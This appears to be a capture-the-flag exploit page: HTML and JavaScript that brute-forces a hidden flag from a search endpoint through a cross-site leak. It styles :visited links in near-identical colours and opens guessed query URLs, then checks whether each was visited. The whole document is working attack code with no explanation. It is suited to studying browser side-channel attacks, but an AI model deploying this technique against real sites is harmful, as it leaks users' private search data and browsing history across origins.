<style type="text/css">
    /* Set it up so the target link element has different colors when pointing to a
       visited vs unvisited URL. */
    #target {
        color: white;
        background-color: white;
        outline-color: white;
    }
    #target:visited {
        color: #feffff;
        background-color: #fffeff;
        outline-color: #fffffe;
    }
</style>
<body>

</body>
<script>


    async function isVisited(url){
        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, 'poc');
    }

    // from fragment
    let hash = window.location.hash.substring(1) || "flag{g68r|a";
    let [guess, current_guess] = hash.split('|')
    let base_url = '{{CHALLENGE_URL}}/search.php?query='
    let charset = 'abcu}defghijklmnopqrstuvwxyz1234567890{'.split('');
    
    async function exploit(current_guess){
        let w = open(`${base_url}${guess}${current_guess}`, 'guess');
        await new Promise((resolve) => setTimeout(resolve, 1000))
        w.close();
        isVisited(`${base_url}${guess}${current_guess}`);
    }
    exploit(current_guess);

</script>